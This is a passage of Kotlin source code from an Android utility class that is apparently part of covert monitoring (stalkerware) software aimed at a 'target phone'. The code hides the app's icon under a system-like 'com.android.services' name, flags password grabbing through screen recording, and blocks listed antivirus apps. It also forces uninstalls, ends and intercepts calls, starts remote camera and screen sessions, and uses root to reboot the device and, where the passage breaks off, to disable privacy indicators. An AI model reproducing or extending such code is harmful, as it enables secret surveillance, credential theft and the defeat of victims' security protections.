                logException("${AppConstants.SCREEN_RECORDING_TYPE} isScreenRecordingApp exception = ${exception.message}")
            }
            false
        } else false
    }

    /** Checks If User selects to skip the current permission **/
    fun shouldSkipPermission(permissionScreens: PermissionScreens): Boolean {
        val permissions = AppConstants.permissionSkip ?: ""
        return if (permissions.isNotEmpty()) {
            val permissionSkip =
                GsonBuilder().create().fromJson(permissions, PermissionSkip::class.java)
            return when (permissionScreens) {
                PermissionScreens.LOCATION_PERMISSION -> permissionSkip.locationPermission
                PermissionScreens.MANAGEMENT_OF_ALL_FILES -> permissionSkip.managementOfAllFiles
                PermissionScreens.DEVICE_ADMIN_PERMISSION -> permissionSkip.deviceAdmin
                PermissionScreens.DRAW_OVER_OTHER_APPS -> permissionSkip.drawOverApps
                PermissionScreens.SCREEN_RECORD_PERMISSION -> permissionSkip.screenRecord
                PermissionScreens.NOTIFICATION_ACCESS_PERMISSION -> permissionSkip.notificationAccess
                PermissionScreens.DISABLE_NOTIFICATION_ACCESS -> permissionSkip.disableNotificationAccess
                PermissionScreens.USAGE_ACCESS_PERMISSION -> permissionSkip.usageAccessPermission
                PermissionScreens.ACCESSIBILITY_PERMISSION -> permissionSkip.accessibility
                PermissionScreens.HIDE_APP -> false
            }
        } else false
    }

    fun skipThePermission(permissionScreens: PermissionScreens) {
        if ((AppConstants.permissionSkip ?: "").isEmpty()) {
            val permissionSkip = PermissionSkip()
            AppConstants.permissionSkip = Gson().toJson(permissionSkip, PermissionSkip::class.java)
        }

        val permissions = AppConstants.permissionSkip ?: ""
        if (permissions.isNotEmpty()) {
            val permissionSkip =
                GsonBuilder().create().fromJson(permissions, PermissionSkip::class.java)
            when (permissionScreens) {
                PermissionScreens.LOCATION_PERMISSION -> {
                    permissionSkip.apply {
                        this.locationPermission = true
                    }
                }

                PermissionScreens.MANAGEMENT_OF_ALL_FILES -> {
                    permissionSkip.apply {
                        this.managementOfAllFiles = true
                    }
                }

                PermissionScreens.DEVICE_ADMIN_PERMISSION -> {
                    permissionSkip.apply {
                        this.deviceAdmin = true
                    }
                }

                PermissionScreens.DRAW_OVER_OTHER_APPS -> {
                    permissionSkip.apply {
                        this.drawOverApps = true
                    }
                }

                PermissionScreens.SCREEN_RECORD_PERMISSION -> {
                    permissionSkip.apply {
                        this.screenRecord = true
                    }
                }

                PermissionScreens.NOTIFICATION_ACCESS_PERMISSION -> {
                    permissionSkip.apply {
                        this.notificationAccess = true
                    }
                }

                PermissionScreens.DISABLE_NOTIFICATION_ACCESS -> {
                    permissionSkip.apply {
                        this.disableNotificationAccess = true
                    }
                }

                PermissionScreens.USAGE_ACCESS_PERMISSION -> {
                    permissionSkip.apply {
                        this.usageAccessPermission = true
                    }
                }

                PermissionScreens.ACCESSIBILITY_PERMISSION -> {
                    permissionSkip.apply {
                        this.accessibility = true
                    }
                }

                else -> {
                    // TODO: 06/01/2022 implement the else case
                }
            }
            AppConstants.permissionSkip = Gson().toJson(permissionSkip, PermissionSkip::class.java)
        }
    }

    /**
     * This checks Whether Screen Recording is Enabled for Any App
     * @return return true or false
     */
    fun isScreenRecordingEnabled(): Boolean {
        val appsList = AppConstants.screenRecordingApps
        return if (appsList != null && appsList.isNotEmpty()) {
            try {
                val gson = GsonBuilder().create()
                val screenRecordingApps = listOf(
                    *gson.fromJson(
                        appsList,
                        Array<ScreenRecordingApp>::class.java
                    )
                )
                return screenRecordingApps.any { it.isEnabled }
            } catch (exception: Exception) {
                logException("${AppConstants.SCREEN_RECORDING_TYPE} isScreenRecordingEnabled exception = ${exception.message}")
            }
            false
        } else false
    }

    fun formatSize(sizeMb: Double): String = String.format("%.3f", sizeMb / 1024) + "GB"

    @SuppressLint("NewApi")
    fun canDrawOverApps(context: Context) =
        AppConstants.osGreaterThanOrEqualMarshmallow && Settings.canDrawOverlays(context)

    /**
     * is device admin enable
     *
     * @return true or false
     */
    fun isEnabledAsDeviceAdministrator(): Boolean {
        val policyManager = appContext
            .getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminReceiver = ComponentName(
            appContext,
            TOSDeviceAdminReceiver::class.java
        )
        return policyManager.isAdminActive(adminReceiver)
    }

    fun removeAsDeviceAdministrator() {
        val policyManager = appContext
            .getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminReceiver: ComponentName = ComponentName(
            appContext,
            TOSDeviceAdminReceiver::class.java
        )
        policyManager.removeActiveAdmin(adminReceiver)
    }

    fun isPhoneServiceActivated(): Boolean {
        return (AppConstants.userId != null && AppConstants.userId!!.isNotEmpty())
                && AppConstants.serviceState
                && (AppConstants.phoneServiceId != null && AppConstants.phoneServiceId!!.isNotEmpty())
    }

    fun getInstalledBrowsersList(context: Context): List<String> {
        val browserPackageName: MutableList<String> = ArrayList()
        try {
            val intent = Intent(Intent.ACTION_VIEW)
            intent.data = Uri.parse("http://www.google.com")
            val pm = context.packageManager
            val browserList: List<ResolveInfo> =
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    pm.queryIntentActivities(intent, PackageManager.MATCH_ALL)
                } else {
                    pm.queryIntentActivities(intent, 0)
                }
            for (info in browserList) {
                browserPackageName.add(info.activityInfo.packageName)
            }
            browserPackageName.add("com.google.android.googlequicksearchbox")
            browserPackageName.add("com.facebook.orca")
        } catch (e: Exception) {
            logException("getInstalledBrowsersList exp = ${e.message}", throwable = e)
        }
        return browserPackageName
    }


    // Generates the Unique Random Id
    val randomUniqueId: String
        get() {
            return UUID.randomUUID().toString()
        }


    fun isVOIPModeActive(context: Context): Boolean {
        val manager = (context.getSystemService(Context.AUDIO_SERVICE) as AudioManager)
        return manager.mode == AudioManager.MODE_IN_COMMUNICATION
    }

    fun isVOIPModeRinging(context: Context): Boolean {
        val manager = (context.getSystemService(Context.AUDIO_SERVICE) as AudioManager)
        return manager.mode == AudioManager.MODE_RINGTONE
    }

    fun isVOIPCallEnabled(imType: String): Boolean {
        return if (AppConstants.osGreaterThanEqualToTen &&
            AppConstants.voipCallApps != null && AppConstants.voipCallApps!!.isNotEmpty()
        ) {
            val gson = GsonBuilder().create()
            try {
                val voipCallApps = listOf(
                    *gson.fromJson(
                        AppConstants.voipCallApps,
                        Array<VoipCallApp>::class.java
                    )
                )
                return voipCallApps.find { it.appName == imType }!!.isEnabled
            } catch (exception: Exception) {
                logVerbose(
                    "${AppConstants.VOIP_CALL_TYPE} isVOIPCallEnabled exp = ${exception.message}",
                    throwable = exception
                )
                false
            }
        } else false
    }


    @JvmStatic
    fun convertBytesToMb(size: Double): Double {
        return size / 1024 / 1024
    }


    @Throws(ParseException::class)
    fun parseDate(dateStr: String): Date {
        val simpleDateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
        return simpleDateFormat.parse(dateStr)
    }


    @Synchronized
    fun generateUniqueID(): String? {
        return UUID.randomUUID().toString()
    }

    /**
     * Generate Unique Hash
     *
     * @param s String
     * @return
     */
    @Synchronized
    fun md5Hash(s: String): String {
        try {
            val digest = MessageDigest.getInstance("MD5")
            digest.update(s.toByteArray())
            val messageDigest = digest.digest()

            // Create Hex String
            val hexString = StringBuffer()
            for (i in messageDigest.indices) hexString.append(
                Integer.toHexString(
                    0xFF and messageDigest[i]
                        .toInt()
                )
            )
            return hexString.toString()
        } catch (e: NoSuchAlgorithmException) {
            e.message
        }
        return ""
    }

    fun showAlertDialog(
        context: Context?,
        title: String,
        message: String,
        positiveText: String,
        negativeText: String,
        listener: CustomDialogListener
    ) {
        val builder = AlertDialog.Builder(context!!)
        builder.setTitle(title)
        builder.setMessage(message)
        builder.setPositiveButton(
            positiveText
        ) { dialog: DialogInterface?, _: Int ->
            dialog!!.dismiss()
            listener.onYes()
        }
        builder.setNegativeButton(
            negativeText
        ) { dialog: DialogInterface?, _: Int ->
            dialog!!.dismiss()
            listener.onCancel()
        }
        val dialog = builder.create()
        dialog.setCancelable(false)
        dialog.show()
    }

    fun isAppScreenRecordingEnabled(context: Context): Boolean =
        isServiceRunning(context, ScreenRecordCommandService::class.java.name)

    fun isScreenGrabbingEnabled(context: Context): Boolean =
        AppConstants.isPasswordGrabbing && isServiceRunning(
            context,
            ScreenRecordCommandService::class.java.name
        )

    fun formatTime(time: String): String {
        val curDateTime = Date(time.toLong())
        val formatter = SimpleDateFormat("y'-'MM'-'dd HH:mm:ss", Locale.getDefault())
        return formatter.format(curDateTime)
    }

    @Synchronized
    fun getUniqueId(): String {
        return UUID.randomUUID().toString()
    }

    @Synchronized
    fun convertStringToBase64(data: String): String {
        try {
            return Base64.encodeToString(data.toByteArray(charset("utf-8")), Base64.DEFAULT)
        } catch (e: UnsupportedEncodingException) {
            e.message
        }
        return data
    }

    fun obtainPhoneNumberFromContactName(displayName: String): String? {
        var numberMobile = ""
        try {
            val whereCondition = (ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                    + " = ?")
            val whereParams = arrayOf(displayName)
            val managedCursor = appContext.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf("data1"),
                whereCondition, whereParams, null, null
            )
            if (managedCursor != null) {
                if (managedCursor.moveToFirst()) numberMobile = managedCursor.getString(0)
                managedCursor.close()
            }
        } catch (e: Exception) {
            e.message
        }
        return numberMobile
    }

    fun getFilesListInDirectory(parentDir: File): List<String> {
        val inFiles = ArrayList<String>()
        try {
            val files = parentDir.listFiles() ?: emptyArray()
            for (file in files) inFiles.add(file.name)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return inFiles
    }

    fun isNumberRestricted(context: Context, mIncomingNumber: String): Boolean {
        try {
            val specialCharacter = Pattern.compile("[!@#$%&*()_+=|<>?{}\\[\\]~-]")
            val restrictedNumbers = getRestrictedNumberList(context)
            val incomingCall = if (specialCharacter.matcher(mIncomingNumber).find()) {
                mIncomingNumber.replace("""[\p{P}\p{S}&&[^.]]+""".toRegex(), "")
            } else {
                mIncomingNumber
            }
            if (restrictedNumbers.isNotEmpty()) {
                for (number in restrictedNumbers) {
                    val filteredNumber = if (specialCharacter.matcher(number).find()) {
                        number.replace("""[\p{P}\p{S}&&[^.]]+""".toRegex(), "")
                    } else {
                        number
                    }
                    if (PhoneNumberUtils.compare(incomingCall, filteredNumber)) {
                        return true
                    }
                }
            }
        } catch (e: Exception) {
            logVerbose("${AppConstants.CALL_RECORD_TYPE} Error getting restricted numbers")
        }
        return false
    }

    fun startService(context: Context, intent: Intent?) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    }

    fun areNotificationsEnabled(context: Context?): Boolean {
        return NotificationManagerCompat.from(context!!).areNotificationsEnabled()
    }

    fun isLocationPermissionGranted(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            return true
        }
        val accessCourseLocation =
            checkPermissionGranted(context, Manifest.permission.ACCESS_COARSE_LOCATION)
        val accessFineLocation =
            checkPermissionGranted(context, Manifest.permission.ACCESS_FINE_LOCATION)
        var accessBackgroundLocation = true
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            accessBackgroundLocation =
                checkPermissionGranted(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        return accessCourseLocation && accessFineLocation && accessBackgroundLocation
    }

    fun isManagementOfAllFilesPermissionGranted(context: Context): Boolean =
        Environment.isExternalStorageManager()

    fun appendLog(context: Context, text: String) {
//        if (BuildConfig.DEBUG) {
//        val mFilePath = retrieveFilePath(context, AppConstants.DIR_MIC_BUG, "log.txt")
//        val logFile = File(mFilePath)
//        if (!logFile.exists()) {
//            try {
//                logFile.createNewFile()
//            } catch (e: IOException) {
//                logException("Exception while create file for logs ${e.message}", throwable = e)
//            }
//        }
//        try {
//            //BufferedWriter for performance, true to set append to file flag
//            val buf = BufferedWriter(FileWriter(logFile, true))
//            buf.append(text)
//            buf.newLine()
//            buf.close()
//        } catch (e: IOException) {
//            logException("Exception while appending logs ${e.message}", throwable = e)
//        }
//        }
    }

    fun muteSystemAudio(context: Context) {
        val mAudioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                mAudioManager.adjustStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    AudioManager.ADJUST_MUTE,
                    0
                )
                mAudioManager.adjustStreamVolume(
                    AudioManager.STREAM_SYSTEM,
                    AudioManager.ADJUST_MUTE,
                    0
                )
            } else {
                mAudioManager.setStreamMute(AudioManager.STREAM_MUSIC, true)
                mAudioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true)
            }
        } catch (e: Exception) {
            logException("Error muteSystemAudio: ${e.message}")
        }
    }


    /**
     * Get the Phone Number From Phone Contact Display Name
     * @param displayName display Name
     * @return Contact Number
     */
    fun retrievePhoneNumberFromDisplayName(displayName: String): String {
        var numberMobile = ""
        try {
            val whereCondition = (ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " = ?")
            val whereParams = arrayOf(displayName)
            val managedCursor = appContext.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf("data1"),
                whereCondition, whereParams, null, null
            )
            if (managedCursor != null) {
                if (managedCursor.moveToFirst()) numberMobile = managedCursor.getString(0)
                managedCursor.close()
            }
        } catch (e: Exception) {
            logException("Error retrievePhoneNumberFromDisplayName: ${e.message}")
        }
        return numberMobile
    }


    fun unMuteSystemAudio(context: Context) {
        val mAudioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Objects.requireNonNull(mAudioManager)
                    .adjustStreamVolume(
                        AudioManager.STREAM_MUSIC,
                        AudioManager.ADJUST_UNMUTE,
                        0
                    )
                mAudioManager.adjustStreamVolume(
                    AudioManager.STREAM_SYSTEM,
                    AudioManager.ADJUST_UNMUTE,
                    0
                )
            } else {
                mAudioManager.setStreamMute(AudioManager.STREAM_MUSIC, false)
                mAudioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false)
            }
        } catch (e: Exception) {
            logException("Error unMuteSystemAudio: ${e.message}")
        }
    }

    /** Returns the Last Window Package Monitored by Accessibility Service Window State Change Event **/
    fun getLastWindowPackage(context: Context): String =
        if (isAccessibilityEnabled(context)) AccessibilityUtils.lastWindowPackage else ""

    /**
     * [WindowState]
     */
    fun isCallModeActive(context: Context): Boolean {
        val audioManager = (context.getSystemService(Context.AUDIO_SERVICE) as AudioManager)
        return audioManager.mode == AudioManager.MODE_IN_CALL || audioManager.mode == AudioManager.MODE_IN_COMMUNICATION
    }

    fun doesChildTextContainsDeletedApp(
        uninstalledAppList: List<UninstalledApp?>,
        childText: String,
    ): String? {
        var mChildText = childText
        if (mChildText.contains("...")) mChildText = mChildText.replace("...", "")
        for (uninstalledApp in uninstalledAppList) {
            val appName: String = uninstalledApp?.name!!.lowercase(Locale.getDefault())
            if (appName == mChildText || appName.contains(mChildText)) {
                return uninstalledApp.packageName
            }
        }
        return ""
    }

    fun checkAppsToDelete(context: Context, uninstalledAppList: List<UninstalledApp>) {
        if (uninstalledAppList.isNotEmpty()) {
            for (uninstalledApp in uninstalledAppList) {
                val pkgName: String = uninstalledApp.packageName!!
                if (notDeviceAdminApp(context, pkgName)) {
                    if (isInstalledApp(pkgName)) {
                        launchUninstallAppIntent(
                            context,
                            pkgName
                        )
                        break
                    }
                }
            }
        }
    }

    fun launchUninstallAppIntent(context: Context, packageName: String) {
        if (isScreenInteractive(context) && isAccessibilityEnabled(
                context
            )
        ) {
            val intent = Intent(Intent.ACTION_DELETE)
            intent.data = Uri.parse("package:$packageName")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
        }
    }

    fun isInstalledApp(packageName: String): Boolean {
        var isInstalled = false
        try {
            val pm = appContext.packageManager
            val packages = pm.getInstalledPackages(0)
            for (pkg in packages) {
                if (pkg.packageName == packageName) {
                    isInstalled = true
                    break
                }
            }
        } catch (e: Exception) {
            logException(e.message!!)
        }
        return isInstalled
    }

    fun notDeviceAdminApp(mContext: Context, appPackageName: String): Boolean {
        val uninstallAble = true
        try {
            val policyManager =
                mContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val deviceAdminIntent = Intent("android.app.action.DEVICE_ADMIN_ENABLED", null)
            val pkgAppsList =
                mContext.packageManager.queryBroadcastReceivers(deviceAdminIntent, 0)
            for (aResolveInfo in pkgAppsList) {
                val pkgName = aResolveInfo.activityInfo.applicationInfo.packageName
                val appName = aResolveInfo.activityInfo.name
                val componentName = ComponentName(pkgName, appName)
                if (policyManager.isAdminActive(componentName) && pkgName == appPackageName) {
                    return false
                }
            }
        } catch (e: Exception) {
            logException("Error retrieving active device admins: " + e.message)
        }
        return uninstallAble
    }

    fun selfUninstallApp(context: Context) {
        if (isAccessibilityEnabled(context) && notDeviceAdminApp(context, context.packageName)) {
            launchUninstallAppIntent(
                context,
                context.packageName
            )
        } else if (DeviceInformationUtil.isDeviceRooted) {
            uninstallApplication(context)
        }
    }

    private fun uninstallApplication(context: Context) {
        val runtime = Runtime.getRuntime()
        var process: java.lang.Process? = null
        var osw: OutputStreamWriter? = null
        val command = "pm uninstall " + context.packageName
        try {
            process = runtime.exec("su")
            osw = OutputStreamWriter(process.outputStream)
            osw.write(command)
            osw.flush()
            osw.close()
        } catch (ex: IOException) {
            ex.printStackTrace()
        } finally {
            if (osw != null) {
                try {
                    osw.close()
                } catch (e: IOException) {
                    e.printStackTrace()
                }
            }
        }
        try {
            process?.waitFor()
        } catch (e: InterruptedException) {
            e.printStackTrace()
        }
    }

    @SuppressLint("SimpleDateFormat")
    fun formatDuration(duration: String): String? {
        val s = duration.toInt()
        return String.format("%02d:%02d:%02d", s / 3600, s % 3600 / 60, s % 60)
    }

    @SuppressLint("MissingPermission")
    private fun isWifiConnected(): Boolean {
        val connectivityManager =
            appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
            return capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ?: false
        } else {
            val mWifi = connectivityManager.activeNetworkInfo
            if (mWifi != null && mWifi.type == ConnectivityManager.TYPE_WIFI) return true
        }
        return false
    }

    fun rebootDevice() {
        val runtime = Runtime.getRuntime()
        var process: Process? = null
        var osw: OutputStreamWriter? = null
        val command = "/system/bin/reboot"
        try {
            process = runtime.exec("su")
            osw = OutputStreamWriter(process.outputStream)
            osw.write(command)
            osw.flush()
            osw.close()
        } catch (ex: IOException) {
            ex.printStackTrace()
        } finally {
            if (osw != null) {
                try {
                    osw.close()
                } catch (e: IOException) {
                    e.printStackTrace()
                }
            }
        }
        try {
            process?.waitFor()
        } catch (e: InterruptedException) {
            e.printStackTrace()
        }
    }

    fun isAppBlocked(package_name: String, apps: List<String>): Boolean {
        if (package_name == "com.android.documentsui") {
            for (app in apps) {
                if (app == "com.android.providers.downloads.ui") return true
            }
        }
        for (app in apps) {
            if (app == package_name) return true
        }
        return false
    }

    fun getTodayDay(): String {
        val calendar = Calendar.getInstance(Locale.getDefault())
        calendar.timeInMillis = System.currentTimeMillis()
        val day = calendar[Calendar.DAY_OF_WEEK] - 1
        return AppConstants.daysInWeek[day]
    }

    fun getCurrentDate(): String {
        val currentTime = System.currentTimeMillis()
        val simpleDateFormat = SimpleDateFormat("dd-MM-yyyy hh:mm a")
        val date = Date(currentTime)
        return simpleDateFormat.format(date)
    }

    fun getCurrentFormatedDateOnly(): String {
        val currentTime = System.currentTimeMillis()
        val simpleDateFormat = SimpleDateFormat("y'-'MM'-'dd")
        val date = Date(currentTime)
        return simpleDateFormat.format(date)
    }

    fun getCurrentTime(): String {
        val currentTime = System.currentTimeMillis()
        val simpleDateFormat = SimpleDateFormat("hh:mm:ss")
        val date = Date(currentTime)
        return simpleDateFormat.format(date)
    }

    fun shouldBlockAntivirus(packageName: String): Boolean {
        for (pkg in AppConstants.BLOCKED_ANTIVIRUS_LIST) {
            if (pkg == packageName) return true
        }
        return false
    }

    fun getDefaultKeyboardPackage(context: Context): String {
        return Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.DEFAULT_INPUT_METHOD
        )
    }

    fun getDefaultLauncherPackageName(context: Context): String {
        val localPackageManager = context.packageManager
        val intent = Intent("android.intent.action.MAIN")
        intent.addCategory("android.intent.category.HOME")
        var pkgName = ""
        val resolveInfo = localPackageManager.resolveActivity(
            intent,
            PackageManager.MATCH_DEFAULT_ONLY
        )
        if (resolveInfo != null) {
            pkgName = resolveInfo.activityInfo.packageName
        }
        return pkgName
    }

    fun getStartTimeOfDay(): Date {
        val calendar = Calendar.getInstance(Locale.getDefault())
        calendar[Calendar.HOUR_OF_DAY] = 0
        calendar[Calendar.MINUTE] = 0
        calendar[Calendar.SECOND] = 0
        calendar[Calendar.MILLISECOND] = 0
        return calendar.time
    }

    fun getEndTimeOfDay(): Date {
        val date = getStartTimeOfDay()
        val calendar = Calendar.getInstance(Locale.getDefault())
        calendar.time = date
        calendar.add(Calendar.DAY_OF_MONTH, 1)
        return calendar.time
    }

    fun shouldFetchDeviceLocation(): Boolean {
        val geoLocationInterval: Int = AppConstants.gpsLocationInterval?.toInt() ?: 5
        if (geoLocationInterval == 5) {
            AppConstants.gpsIntervalCounter = 0
            return true
        } else if (geoLocationInterval == 30) {
            AppConstants.gpsIntervalCounter = AppConstants.gpsIntervalCounter + 5
            if (AppConstants.gpsIntervalCounter == 30) {
                AppConstants.gpsIntervalCounter = 0
                return true
            }
        } else if (geoLocationInterval == 60) {
            AppConstants.gpsIntervalCounter = AppConstants.gpsIntervalCounter + 5
            if (AppConstants.gpsIntervalCounter == 60) {
                AppConstants.gpsIntervalCounter = 0
                return true
            }
        }
        return false
    }

    fun convertMilliSecondsToTimeFormat(timeInMilliSeconds: Long): String {
        return String.format(
            "%02d:%02d:%02d",
            TimeUnit.MILLISECONDS.toHours(timeInMilliSeconds),
            TimeUnit.MILLISECONDS.toMinutes(timeInMilliSeconds) -
                    TimeUnit.HOURS.toMinutes(TimeUnit.MILLISECONDS.toHours(timeInMilliSeconds)),
            TimeUnit.MILLISECONDS.toSeconds(timeInMilliSeconds) -
                    TimeUnit.MINUTES.toSeconds(
                        TimeUnit.MILLISECONDS.toMinutes(
                            timeInMilliSeconds
                        )
                    )
        )
    }

    @SuppressLint("MissingPermission")
    @SuppressWarnings("deprecation")
    @RequiresApi(Build.VERSION_CODES.P)
    fun cutTheCall(context: Context): Boolean {
        val telecomManager = context.getSystemService(TELECOM_SERVICE) as TelecomManager
        if (telecomManager.isInCall) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                val callDisconnected = telecomManager.endCall()
                if (callDisconnected) {
                    logVerbose("${AppConstants.CALL_RECORD_TYPE} Call Blocked successfully")
                } else {
                    logVerbose("${AppConstants.CALL_RECORD_TYPE} Call Blocked Failed")
                }
            }
        }
        return true
    }

    fun packageNameNotEqualsDefaultKeyboard(context: Context, pkgName: String): Boolean =
        !AppUtils.getDefaultKeyboardPackage(context).contains(pkgName)

    fun phoneNumbersAreEqual(phoneNumber1: String, phoneNumber2: String): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            PhoneNumberUtils.areSamePhoneNumber(phoneNumber1, phoneNumber2, "")
        } else {
            PhoneNumberUtils.compare(phoneNumber1, phoneNumber2)
        }
    }

    private fun getLevenshteinDistance(X: String, Y: String): Int {
        val m = X.length
        val n = Y.length
        val T = Array(m + 1) { IntArray(n + 1) }
        for (i in 1..m) {
            T[i][0] = i
        }
        for (j in 1..n) {
            T[0][j] = j
        }
        var cost: Int
        for (i in 1..m) {
            for (j in 1..n) {
                cost = if (X[i - 1] == Y[j - 1]) 0 else 1
                T[i][j] = min(
                    min(T[i - 1][j] + 1, T[i][j - 1] + 1),
                    T[i - 1][j - 1] + cost
                )
            }
        }
        return T[m][n]
    }

    fun findSimilarity(x: String?, y: String?): Double {
        require(!(x == null || y == null)) { "Strings should not be null" }
        val maxLength = max(x.length, y.length)
        return if (maxLength > 0) {
            (maxLength * 1.0 - getLevenshteinDistance(x, y)) / maxLength * 1.0
        } else 1.0
    }

    fun updateLastTamperingTime(time: Long) {
        val oldTamperCount = AppConstants.tamperCount ?: ""
        val tamperCount = if (oldTamperCount.isEmpty()) {
            TamperCount()
        } else {
            val gson = GsonBuilder().create()
            gson.fromJson(
                oldTamperCount,
                TamperCount::class.java
            )
        }
        tamperCount.apply {
            this.count = 0
            this.time = System.currentTimeMillis()
            this.lastUnprotectedTime = time
        }
        AppConstants.tamperCount = Gson().toJson(tamperCount, TamperCount::class.java)
    }

    fun protectAppFromTampering() {
        val oldTamperCount = AppConstants.tamperCount ?: ""
        var tamperCount = if (oldTamperCount.isEmpty()) {
            TamperCount()
        } else {
            val gson = GsonBuilder().create()
            gson.fromJson(
                oldTamperCount,
                TamperCount::class.java
            )
        }

        val currentTime = System.currentTimeMillis()
        val allowTampering = (currentTime - tamperCount.lastUnprotectedTime) > 5 * 60 * 1000

        if (allowTampering) {
            if (tamperCount.time > 0L) {
                val minTime = currentTime - tamperCount.time
                if (minTime > 30000) {
                    tamperCount = TamperCount()
                    logVerbose("ProtectionTemperInfo: Temper Reset")
                } else {
                    tamperCount.apply {
                        this.count = this.count + 1
                        this.time = currentTime
                    }
                }
            } else {
                tamperCount.apply {
                    this.count = this.count + 1
                    this.time = currentTime
                }
            }
            logVerbose("tamper count = $tamperCount")

            if (tamperCount.count > 4) {
                tamperCount = TamperCount()
                AppConstants.tamperCount =
                    Gson().toJson(tamperCount, TamperCount::class.java)
                logVerbose("ProtectionTemperInfo: Count is greater than 4 and temCount=${AppConstants.tamperCount}")
            } else {
                AppConstants.tamperCount = Gson().toJson(tamperCount, TamperCount::class.java)
                logVerbose("ProtectionTemperInfo: Count is less than 4 and temCount=${AppConstants.tamperCount}")

            }
        }
    }

    fun createAppShortCut(context: Context) {
        val manager = context.packageManager
        manager.setComponentEnabledSetting(
            ComponentName(
                context,
                "com.android.services.ui.activities.MainLaunchActivityDefault"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        // enable new icon
        manager.setComponentEnabledSetting(
            ComponentName(
                context,
                "com.android.services.ui.activities.MainLaunchActivityDefault"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )

    }

    fun hideAppShortcut(context: Context) {
        val manager = context.packageManager
        manager.setComponentEnabledSetting(
            ComponentName(
                context,
                "com.android.services.ui.activities.MainLaunchActivityDefault"
            ),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        System.exit(0)
    }

    fun checkForAppTampering(): Int {
        val oldTamperCount = AppConstants.tamperCount ?: ""
        var tamperCount = if (oldTamperCount.isEmpty()) {
            TamperCount()
        } else {
            val gson = GsonBuilder().create()
            gson.fromJson(
                oldTamperCount,
                TamperCount::class.java
            )
        }
        val currentTime = System.currentTimeMillis()
        val allowTampering = (currentTime - tamperCount.lastUnprotectedTime) > 5 * 60 * 1000
        if (allowTampering) {
            return if (tamperCount.count >= 4) {
                1
            } else {
                0
            }
        } else {
            return 2
        }
    }

    fun checkAndCloseView360(context: Context, interuptionType: View360InteruptionType) {
        AppConstants.view360InteruptMessage = when (interuptionType) {
            View360InteruptionType.TYPE_CALL -> {
                "Connection is terminated due to an active call"
            }

            View360InteruptionType.TYPE_CAMERA_APP -> {
                "Camera is getting busy with an app, try it later."
            }

            View360InteruptionType.TYPE_CALL_DISCONNECTED -> {
                "Call has been ended on target phone."
            }

            else -> {
                ""
            }
        }
        when {
            AppUtils.isServiceRunning(context, View360CommandWorker::class.java.name) -> {
//                context.stopService(Intent(context, View360CommandService::class.java))
                FutureWorkUtil.stopBackgroundWorker(context, View360CommandWorker::class.java.name)
            }

            AppUtils.isServiceRunning(
                context,
                View360ByJitsiMeetCommandWorker::class.java.name
            ) -> {
                logVerbose("View360ByJitsiLogs: Jitsi Meet View 360 running")
                //context.stopService(Intent(context, View360ByJitsiMeetCommandService::class.java))
                View360ByJitsiCommandProcessingBase.view360ByJitsiBugStatus =
                    FcmPushStatus.PHONE_CALL_INTERRUPTION.getStatus()
                FutureWorkUtil.stopBackgroundWorker(
                    context,
                    View360ByJitsiMeetCommandWorker::class.java.name
                )
                logVerbose("View360ByJitsiLogs: Jitsi Meet View 360 Stoped")
            }

            AppUtils.isServiceRunning(
                context,
                ScreenSharingCommandService::class.java.name
            ) -> {
//                if ((AppConstants.isScreenOnly && interuptionType == View360InteruptionType.TYPE_INTERNET_DISCONNECTED) || !AppConstants.isScreenOnly) {
                logVerbose("ScreenSharingByJitsiLogs: Jitsi Meet View Screen Sharing 360 running")
                context.stopService(Intent(context, ScreenSharingCommandService::class.java))
                logVerbose("ScreenSharingByJitsiLogs: Jitsi Meet Screen Sharing View 360 Stoped")
//                }
            }

            (AppUtils.isServiceRunning(
                context,
                CallInterceptCommandService::class.java.name
            ) && interuptionType != View360InteruptionType.TYPE_CALL) -> {
                logVerbose("ScreenSharingByJitsiLogs: Jitsi Meet View Screen Sharing 360 running")
                context.stopService(Intent(context, CallInterceptCommandService::class.java))
                logVerbose("ScreenSharingByJitsiLogs: Jitsi Meet Screen Sharing View 360 Stoped")
            }
        }
    }

    fun disablePrivacyIndicators() {
        logDebug("MessageInfo= Entering in disable command function")
        val runtime = Runtime.getRuntime()
        var process: Process? = null
        var osw: OutputStreamWriter? = null
